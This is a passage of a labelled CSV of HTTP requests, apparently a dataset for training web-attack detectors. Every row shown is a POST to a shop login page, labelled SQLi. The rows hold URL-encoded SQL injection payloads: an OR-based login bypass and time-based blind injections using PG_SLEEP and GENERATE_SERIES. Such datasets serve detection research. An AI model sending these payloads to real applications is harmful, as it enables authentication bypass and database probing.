,id,method,path,query,label
33,10033,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%22BzBv%22%3D%22BzBv,SQLi
34,10034,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%22qmgy%22%20LIKE%20%22qmgy,SQLi
35,10035,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%28%22mVeD%22%20LIKE%20%22mVeD,SQLi
36,10036,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%28%28%28%22IHHd%22%20LIKE%20%22IHHd,SQLi
37,10037,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%205665%3D%28SELECT%205665%20FROM%20PG_SLEEP%285%29%29%20AND%20%22BrdZ%22%20LIKE%20%22BrdZ,SQLi
38,10038,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--,SQLi
39,10039,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--,SQLi
40,10040,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--,SQLi
41,10041,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--,SQLi
42,10042,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%285326%3D5326,SQLi
43,10043,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%284807%3D4807,SQLi
44,10044,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%28%28397%3D397,SQLi
45,10045,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--,SQLi
46,10046,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%27IVkg%27%3D%27IVkg,SQLi
47,10047,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%28%27HwAv%27%3D%27HwAv,SQLi
48,10048,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%28%28%27KIca%27%3D%27KIca,SQLi
49,10049,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%27yttK%27%3D%27yttK,SQLi
50,10050,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%27xKfI%27%20LIKE%20%27xKfI,SQLi
51,10051,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%28%27tdYu%27%20LIKE%20%27tdYu,SQLi
52,10052,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%28%28%27bXLV%27%20LIKE%20%27bXLV,SQLi
53,10053,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%27JsAc%27%20LIKE%20%27JsAc,SQLi
54,10054,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%22gJco%22%3D%22gJco,SQLi
55,10055,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%28%22TonU%22%3D%22TonU,SQLi
56,10056,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%28%28%22DgoD%22%3D%22DgoD,SQLi
57,10057,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%22zgBE%22%3D%22zgBE,SQLi
58,10058,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%22CNuY%22%20LIKE%20%22CNuY,SQLi
59,10059,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%28%22YwQz%22%20LIKE%20%22YwQz,SQLi
60,10060,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%28%28%28%22PykV%22%20LIKE%20%22PykV,SQLi
61,10061,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%203710%3D%28SELECT%203710%20FROM%20PG_SLEEP%285%29%29--%20AND%20%22eAmL%22%20LIKE%20%22eAmL,SQLi
62,10062,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29,SQLi
63,10063,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29,SQLi
64,10064,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29,SQLi
65,10065,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29,SQLi
66,10066,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%286625%3D6625,SQLi
67,10067,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%288660%3D8660,SQLi
68,10068,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%29%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%28%287845%3D7845,SQLi
69,10069,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29,SQLi
70,10070,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%27QeSL%27%3D%27QeSL,SQLi
71,10071,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%28%27kXdh%27%3D%27kXdh,SQLi
72,10072,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%28%28%27Smjt%27%3D%27Smjt,SQLi
73,10073,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%27dajY%27%3D%27dajY,SQLi
74,10074,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%27Tnlm%27%20LIKE%20%27Tnlm,SQLi
75,10075,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%28%27VSaQ%27%20LIKE%20%27VSaQ,SQLi
76,10076,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%29%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%28%28%27Tplm%27%20LIKE%20%27Tplm,SQLi
77,10077,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%27lptS%27%20LIKE%20%27lptS,SQLi
78,10078,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%22LOee%22%3D%22LOee,SQLi
79,10079,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%28%22kSno%22%3D%22kSno,SQLi
80,10080,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%28%28%22jYsS%22%3D%22jYsS,SQLi
81,10081,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%22Bnkr%22%3D%22Bnkr,SQLi
82,10082,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%22Iroa%22%20LIKE%20%22Iroa,SQLi
83,10083,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%28%22SVub%22%20LIKE%20%22SVub,SQLi
84,10084,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%29%29%29%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%28%28%28%22DBKP%22%20LIKE%20%22DBKP,SQLi
85,10085,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%207696%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29%20AND%20%22jvqf%22%20LIKE%20%22jvqf,SQLi
86,10086,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--,SQLi
87,10087,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%29%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--,SQLi
88,10088,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%27%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--,SQLi
89,10089,POST,/tienda1/publico/autenticar.jsp,login=61%27%20OR%20%2761%27=%2761&pwd=FrAmE30.&remember=&modo=entrar%22%20AND%202146%3D%28SELECT%20COUNT%28%2A%29%20FROM%20GENERATE_SERIES%281%2C5000000%29%29--,SQLi
